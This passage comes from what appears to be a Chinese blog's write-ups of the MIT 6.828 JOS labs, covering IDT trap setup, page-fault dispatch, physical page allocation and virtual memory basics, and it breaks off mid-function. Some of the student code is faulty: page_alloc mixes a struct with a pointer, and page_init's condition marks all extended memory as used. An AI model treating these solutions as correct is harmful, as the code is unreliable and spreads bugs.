    <span class="token keyword">void</span> <span class="token function">t_illop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_device</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_dblflt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_tss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_segnp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_stack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_gpflt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_pgflt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_fperr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_align</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_mchk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_simderr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_syscall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_DIVIDE<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_divide<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_DEBUG<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_debug<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_NMI<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_nmi<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_BRKPT<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_brkpt<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_OFLOW<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_oflow<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_BOUND<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_bound<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_ILLOP<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_illop<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_DEVICE<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_device<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_DBLFLT<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_dblflt<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_TSS<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_tss<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_SEGNP<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_segnp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_STACK<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_stack<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_GPFLT<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_gpflt<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_PGFLT<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_pgflt<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_FPERR<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_fperr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_ALIGN<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_align<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_MCHK<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_mchk<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_SIMDERR<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_simderr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_SYSCALL<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_syscall<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">// Per-CPU setup </span>
    <span class="token function">trap_init_percpu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h3 id="Part_B_3A__u7F3A_u9875_uFF0C_u65AD_u70B9_u5F02_u5E38_u548C_u7CFB_u7EDF_u8C03_u7528"><a href="#Part_B_3A__u7F3A_u9875_uFF0C_u65AD_u70B9_u5F02_u5E38_u548C_u7CFB_u7EDF_u8C03_u7528" class="headerlink" title="Part B: 缺页，断点异常和系统调用"></a>Part B: 缺页，断点异常和系统调用</h3><h4 id="u5904_u7406_u7F3A_u9875_u5F02_u5E38"><a href="#u5904_u7406_u7F3A_u9875_u5F02_u5E38" class="headerlink" title="处理缺页异常"></a>处理缺页异常</h4><p>缺页异常，也就是中断向量 14 (T_PGFLT)，是一个常见的重要异常。当处理器产生缺页，会将线性(也就是虚拟)地址储存在控制寄存器 CR2。</p>
<h4 id="Exercise_5"><a href="#Exercise_5" class="headerlink" title="Exercise 5"></a>Exercise 5</h4><p>修改 trap_dispatch() 使系统将缺页异常传到 page_fault_handler()。完成以后 <code>make grade</code> 应该成功通过faultread, faultreadkernel, faultwrite, faultwritekernel。</p>
<p>查看 <code>inc/trap.h</code> 可以知道 Trapframe 结构体中 tf_trapno 代表中断向量的序号。因此只要判断这个是不是缺页中断就可以了。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span>
<span class="token function">trap_dispatch</span><span class="token punctuation">(</span><span class="token keyword">struct</span> Trapframe <span class="token operator">*</span>tf<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// Handle processor exceptions.</span>
    <span class="token comment" spellcheck="true">// LAB 3: Your code here.</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>tf<span class="token operator">-></span>tf_trapno <span class="token operator">==</span> T_PGFLT<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">page_fault_handler</span><span class="token punctuation">(</span>tf<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">// Unexpected trap: The user process or the kernel has a bug.</span>
    <span class="token function">print_trapframe</span><span class="token punctuation">(</span>tf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>tf<span class="token operator">-></span>tf_cs <span class="token operator">==</span> GD_KT<span class="token punctuation">)</span>
        <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"unhandled trap in kernel"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">env_destroy</span><span class="token punctuation">(</span>curenv<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>当然，这个函数之后还需要完善。</p>
<h4 id="u65AD_u70B9_u5F02_u5E38"><a href="#u65AD_u70B9_u5F02_u5E38" class="headerlink" title="断点异常"></a>断点异常</h4>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[MIT 6.828 Lab 2]]></title>
      <url>http://xinqiu.me/2016/12/09/MIT-6.828-2/</url>
      <content type="html"><![CDATA[<p>继续开始Lab2，这部分内容可以回忆以前的CSAPP的malloc lab.</p>
<a id="more"></a>
<h2 id="u5E8F_u8A00"><a href="#u5E8F_u8A00" class="headerlink" title="序言"></a>序言</h2><p>这个实验要实现内存管理。内存管理有两个部分，第一部分是给内核分配物理内存，内存分配是以4096 bytes为一个单位，也就是页。第二部分是虚拟内存的管理，关于物理内存和虚拟内存的映射。</p>
<p>Lab 2 添加了以下文件:</p>
<ul>
<li>inc/memlayout.h</li>
<li>kern/pmap.c</li>
<li>kern/pmap.h</li>
<li>kern/kclock.h</li>
<li>kern/kclock.c</li>
</ul>
<p>memlayout.h 描述了虚拟地址空间的结构，通过修改pmap.c. memlayout.h 和 pmap.h<br>来实现PageInfo结构，这个是为了记录哪些物理内存的page是空闲的。kclock.c 和 kclock.h 管理PC的时钟和CMOS RAM硬件，这个设备记录了物理内存的数量。pmap.c需要读这个设备来确定内存大小。</p>
<h2 id="Part_1_3A__u7269_u7406_u9875_u7BA1_u7406"><a href="#Part_1_3A__u7269_u7406_u9875_u7BA1_u7406" class="headerlink" title="Part 1: 物理页管理"></a>Part 1: 物理页管理</h2><h3 id="u7269_u7406_u9875"><a href="#u7269_u7406_u9875" class="headerlink" title="物理页"></a>物理页</h3><p>操作系统需要记录物理RAM哪部分是空闲的哪部分在用。JOS使用page granularity来管理物理内存，因此可以用MMU来映射和保护每一块分配的内存。</p>
<p>以下内容要配上 <code>inc/memlayout.h</code> 的图。</p>
<p><img src="1.png" alt=""></p>
<h4 id="Exercise_1"><a href="#Exercise_1" class="headerlink" title="Exercise 1"></a>Exercise 1</h4><p>实现kern/pmap.c中的函数.</p>
<ul>
<li>boot_alloc()</li>
<li>mem_init() (only up to the call to check_page_free_list(1))</li>
<li>page_init()</li>
<li>page_alloc()</li>
<li>page_free()</li>
</ul>
<p>首先看通过查看 mem_init 函数可以知道，boot_alloc 是用来初始化页目录(page directory)。在 boot_alloc 中，nextfree 为下一个空闲内存的虚拟内存地址，当 nextfree 为空时会先初始化。用到了ROUNDUP，这个ROUNDUP在 <code>/inc/types.h</code> 中，因为内存区块是对齐的，所以每块都是固定的大小。npages 是页数量，可使用的内存大小是 npages × PGSIZE ，根据lab1提到的，KERNBASE是分配内存的起始地址，若nextfree 大于 KERNBASE + npages × PGSIZE 的值，就是指针地址溢出了。</p>
<p>所以只需要添加上这部分代码。</p>
<pre class=" language-c"><code class="language-c">result <span class="token operator">=</span> nextfree<span class="token punctuation">;</span>
nextfree <span class="token operator">=</span> <span class="token function">ROUNDUP</span><span class="token punctuation">(</span>nextfree<span class="token operator">+</span>n<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint32_t<span class="token punctuation">)</span>nextfree <span class="token operator">></span> KERNBASE <span class="token operator">+</span> <span class="token punctuation">(</span>npages <span class="token operator">*</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"Out of memory!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>mem_init 在执行完上面的函数以后，会给kern_pgdir加上权限位。</p>
<p>之后就是要初始化所有的struct PageInfo 为 0。首先确定PageInfo的大小，然后用boot_alloc分配内存，接着用memset初始化。</p>
<pre class=" language-c"><code class="language-c">size_t PageInfo_size <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> PageInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>
pages <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> PageInfo <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">boot_alloc</span><span class="token punctuation">(</span>npages <span class="token operator">*</span> PageInfo_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">memset</span><span class="token punctuation">(</span>pages<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> npages <span class="token operator">*</span> PageInfo_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>接着调用page_init()来初始化page结构和内存空闲链表。</p>
<p>参考注释，一步步修改就可以了。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span>
<span class="token function">page_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// The example code here marks all physical pages as free.</span>
    <span class="token comment" spellcheck="true">// However this is not truly the case.  What memory is free?</span>
    <span class="token comment" spellcheck="true">//  1) Mark physical page 0 as in use.</span>
    <span class="token comment" spellcheck="true">//     This way we preserve the real-mode IDT and BIOS structures</span>
    <span class="token comment" spellcheck="true">//     in case we ever need them.  (Currently we don't, but...)</span>
    <span class="token comment" spellcheck="true">//  2) The rest of base memory, [PGSIZE, npages_basemem * PGSIZE)</span>
    <span class="token comment" spellcheck="true">//     is free.</span>
    <span class="token comment" spellcheck="true">//  3) Then comes the IO hole [IOPHYSMEM, EXTPHYSMEM), which must</span>
    <span class="token comment" spellcheck="true">//     never be allocated.</span>
    <span class="token comment" spellcheck="true">//  4) Then extended memory [EXTPHYSMEM, ...).</span>
    <span class="token comment" spellcheck="true">//     Some of it is in use, some is free. Where is the kernel</span>
    <span class="token comment" spellcheck="true">//     in physical memory?  Which pages are already in use for</span>
    <span class="token comment" spellcheck="true">//     page tables and other data structures?</span>
    <span class="token comment" spellcheck="true">//</span>
    <span class="token comment" spellcheck="true">// Change the code to reflect this.</span>
    <span class="token comment" spellcheck="true">// NB: DO NOT actually touch the physical memory corresponding to</span>
    <span class="token comment" spellcheck="true">// free pages!</span>
    size_t i<span class="token punctuation">;</span>
    page_free_list <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> npages<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            pages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pp_ref <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            pages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pp_link <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> npages_basemem<span class="token punctuation">)</span><span class="token punctuation">{</span>
            pages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pp_ref <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            pages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pp_link <span class="token operator">=</span> page_free_list<span class="token punctuation">;</span>
            page_free_list <span class="token operator">=</span> <span class="token operator">&amp;</span>pages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> IOPHYSMEM<span class="token operator">/</span>PGSIZE <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;</span> EXTPHYSMEM<span class="token operator">/</span>PGSIZE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            pages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pp_ref <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> EXTPHYSMEM<span class="token operator">/</span>PGSIZE <span class="token operator">||</span> i <span class="token operator">&lt;</span> <span class="token function">PADDR</span><span class="token punctuation">(</span><span class="token function">boot_alloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span>PGSIZE<span class="token punctuation">)</span><span class="token punctuation">{</span>
            pages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pp_ref<span class="token operator">++</span><span class="token punctuation">;</span>
            pages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pp_link <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            pages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pp_ref <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            pages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pp_link <span class="token operator">=</span> page_free_list<span class="token punctuation">;</span>
            page_free_list <span class="token operator">=</span> <span class="token operator">&amp;</span>pages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>之后需要实现page_alloc函数。这个函数是为了分配一个物理页， 返回对应的结构体。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> PageInfo <span class="token operator">*</span>
<span class="token function">page_alloc</span><span class="token punctuation">(</span><span class="token keyword">int</span> alloc_flags<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">struct</span> PageInfo result<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>page_free_list<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

    result <span class="token operator">=</span> page_free_list<span class="token punctuation">;</span>
    page_free_list <span class="token operator">=</span> page_free_list<span class="token operator">-></span>pp_link<span class="token punctuation">;</span>

    result<span class="token operator">-></span>pp_link <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>alloc_flags <span class="token operator">&amp;</span> ALLOC_ZERO<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">memset</span><span class="token punctuation">(</span><span class="token function">page2kva</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>最后是实现page_free。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span>
<span class="token function">page_free</span><span class="token punctuation">(</span><span class="token keyword">struct</span> PageInfo <span class="token operator">*</span>pp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// Fill this function in</span>
    <span class="token comment" spellcheck="true">// Hint: You may want to panic if pp->pp_ref is nonzero or</span>
    <span class="token comment" spellcheck="true">// pp->pp_link is not NULL.</span>
    <span class="token function">assert</span><span class="token punctuation">(</span>pp<span class="token operator">-></span>pp_ref <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">assert</span><span class="token punctuation">(</span>pp<span class="token operator">-></span>pp_link <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    pp<span class="token operator">-></span>pp_link <span class="token operator">=</span> page_free_list<span class="token punctuation">;</span>
    page_free_list <span class="token operator">=</span> pp<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h2 id="Part_2_3A__u865A_u62DF_u5185_u5B58"><a href="#Part_2_3A__u865A_u62DF_u5185_u5B58" class="headerlink" title="Part 2: 虚拟内存"></a>Part 2: 虚拟内存</h2><h3 id="u865A_u62DF_u5185_u5B58"><a href="#u865A_u62DF_u5185_u5B58" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><h4 id="Exercise_2"><a href="#Exercise_2" class="headerlink" title="Exercise 2"></a>Exercise 2</h4><p>熟悉关于分页地址转换(page translation)和基于页的保护(page-based protection)。</p>
<p>首先介绍一下80386将逻辑地址转为物理地址的方法。</p>
<ul>
<li>分段地址转换，由段选择子和段偏移量构成的逻辑地址转为线性地址。</li>
<li>分页地址转换，线性地址转为物理地址。</li>
</ul>
<p><img src="https://pdos.csail.mit.edu/6.828/2016/readings/i386/fig5-1.gif" alt=""></p>
<p>关于页转换段保护之类的还是查看<a href="https://pdos.csail.mit.edu/6.828/2016/readings/i386/toc.htm" target="_blank" rel="external">Intel 80386 Reference Manual</a>.</p>
<h3 id="u865A_u62DF_u5730_u5740_uFF0C_u7EBF_u6027_u5730_u5740_uFF0C_u7269_u7406_u5730_u5740"><a href="#u865A_u62DF_u5730_u5740_uFF0C_u7EBF_u6027_u5730_u5740_uFF0C_u7269_u7406_u5730_u5740" class="headerlink" title="虚拟地址，线性地址，物理地址"></a>虚拟地址，线性地址，物理地址</h3><p>虚拟地址是有段选择子和段偏移构成。线性地址是经过分段地址转换单没进行分页地址转换。物理地址是两种转换之后最终通过硬件总线到RAM的地址。</p>
<pre><code>           Selector  +--------------+         +-----------+
          ----------&gt;|              |         |           |
                     | Segmentation |         |  Paging   |
Software             |              |--------&gt;|           |----------&gt;  RAM
            Offset   |  Mechanism   |         | Mechanism |
          ----------&gt;|              |         |           |
                     +--------------+         +-----------+
            Virtual                   Linear                Physical
</code></pre><p> C 指针是虚拟地址的偏移部分。在 <code>boot/boot.S</code>中，引入全局描述符表(GDT)将所有段基址设为0到 0xffffffff。因此线性地址等于虚拟地址的偏移量。</p>
<h4 id="Exercise_3"><a href="#Exercise_3" class="headerlink" title="Exercise 3"></a>Exercise 3</h4><p>在QEMU中使用 xp 可以查看物理内存，PD虚拟机对于lab手册上调出QEMU monitor的方法没用，通过查资料发现使用这个也能查看 <code>qemu-system-i386 -hda obj/kern/kernel.img -monitor stdio -gdb tcp::26000 -D qemu.log</code>。</p>
<p>在QEMU monitor中使用 <code>info pg</code> 查看当前页表， <code>info mem</code> 查看虚拟内存的范围。</p>
<p>进入保护模式以后，所有地址引用都是虚拟地址，由MMU转换，也就是说 C 指针都是虚拟地址。</p>
<p>JOS内核经常需要操作地址通过整数而不解引用。JOS为了区分两种情况：类型 uintptr_t 代表虚拟地址，physaddr_t 代表物理地址。虽然都是32位整数，但是不能直接解引用，需要先转型。</p>
<p>JOS需要读取或修改内存，尽管只知道物理地址。给页表添加映射需要分配无力内存去储存一个页目录，然后才能初始化内存。然而内核不能绕过虚拟地址转换，因此不能直接加载和储存物理地址。为了将物理地址转为虚拟地址，内核需要在物理地址加上0xf0000000从而找到相关的虚拟地址，可以使用KADDR(pa)完成这个操作。</p>
<p>同样，如果内核需要通过虚拟地址去找物理地址，就需要减去0xf0000000，可以使用PADDR(va)完成这个操作。</p>
<h3 id="u5F15_u7528_u8BA1_u6570"><a href="#u5F15_u7528_u8BA1_u6570" class="headerlink" title="引用计数"></a>引用计数</h3><p>之后实验经常需要将多个虚拟地址同时映射到同一块物理页上，因此需要给每一个物理页计数引用次数，这个值位于物理页 struct PageInfo 中的 pp_ref 字段中。</p>
<h3 id="u9875_u8868_u7BA1_u7406"><a href="#u9875_u8868_u7BA1_u7406" class="headerlink" title="页表管理"></a>页表管理</h3><p>完成页表管理：插入删除线性到物理地址的映射和创建页表。</p>
<h4 id="Exercise_4"><a href="#Exercise_4" class="headerlink" title="Exercise 4"></a>Exercise 4</h4><p>实现<code>kern/pmap.c</code>里的pgdir_walk()，boot_map_region()，page_lookup()，page_remove()，page_insert()这几个函数。check_page()会测试是否写的正确。</p>
<p>首先是 pgdir_walk()，参考注释可以得知，这个函数获得指向线性地址页表项的指针，传入的参数是页目录指针，线性地址(JOS 将虚拟地址直接映射成了线性地址)和另外一个参数。</p>
<p><img src="2.png" alt=""></p>
<p>由上面的图可以知道二级分页模式下线性地址到物理地址的转换。所以首先要获得页目录地址，判断是否指向的页表项存在，不存在则新建一个页表。这里有两个注意点。第一个地方是要注意判断页表是否存在，根据下图页目录/表的结构，可以知道这里的P位代表Present，用来判断对应的物理页是否存在，存在则为1，所以通过与运算来判断。</p>
<p><img src="3.png" alt=""></p>
<p>另外一个注意点是新建页。为新建的物理页设置页目录时，需要添加上权限位。</p>
<pre class=" language-c"><code class="language-c">pte_t <span class="token operator">*</span>
<span class="token function">pgdir_walk</span><span class="token punctuation">(</span>pde_t <span class="token operator">*</span>pgdir<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>va<span class="token punctuation">,</span> <span class="token keyword">int</span> create<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// Fill this function in</span>
    pde_t <span class="token operator">*</span>pt <span class="token operator">=</span> pgdir <span class="token operator">+</span> <span class="token function">PDX</span><span class="token punctuation">(</span>va<span class="token punctuation">)</span><span class="token punctuation">;</span>
    pde_t <span class="token operator">*</span>pt_addr_v<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>pt <span class="token operator">&amp;</span> PTE_P<span class="token punctuation">)</span> <span class="token punctuation">{</span>
